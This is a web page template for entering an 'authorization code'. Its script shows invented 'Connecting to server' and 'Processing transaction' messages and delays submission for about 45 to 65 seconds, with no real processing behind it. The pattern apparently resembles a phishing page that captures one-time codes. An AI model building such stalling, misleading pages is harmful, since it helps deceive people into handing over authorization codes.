{% extends "base.html" %}

{% block title %}Authorization Code{% endblock %}

{% block content %}
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<div class="card">
    <h2>Enter Authorization Code</h2>

    <form id="authForm" method="POST" action="{{ url_for('auth') }}" class="form-wrap">
        <div class="form-group" style="position: relative;">
            <label for="authInput">Authorization Code:</label>
            <input type="password" name="auth" id="authInput" required class="form-control" placeholder="••••••" style="padding-right: 40px;">
            <span class="toggle-icon" onclick="toggleAuthVisibility()" style="position: absolute; right: 10px; top: 38px; cursor: pointer;">
                <i id="eyeIcon" class="fas fa-eye" style="color: #0f0;"></i>
            </span>
        </div>

        {% if warning %}
        <p class="warning-text">{{ warning }}</p>
        {% endif %}

        <div id="progress" class="progress-message" style="display:none; margin-top: 15px;">
            <p id="msg">Please wait . . .</p>
        </div>

        <div class="form-actions">
            <button type="submit" class="btn-primary">Verify</button>
        </div>
    </form>
</div>

<script>
document.getElementById("authForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const form = this;
    const progress = document.getElementById("progress");
    const msg = document.getElementById("msg");

    progress.style.display = "block";
    msg.innerText = "Please wait . . .";

    setTimeout(() => {
        msg.innerText = "Connecting to server . . .";
        setTimeout(() => {
            msg.innerText = "Processing transaction . . .";
            const finalDelay = 20000 + Math.floor(Math.random() * 20000);
            setTimeout(() => {
                form.submit();
            }, finalDelay);
        }, 15000);
    }, 10000);
});

function toggleAuthVisibility() {
    const input = document.getElementById("authInput");
    const icon = document.getElementById("eyeIcon");
    if (input.type === "password") {
        input.type = "text";
        icon.classList.replace("fa-eye", "fa-eye-slash");
    } else {
        input.type = "password";
        icon.classList.replace("fa-eye-slash", "fa-eye");
    }
}
</script>
{% endblock %}
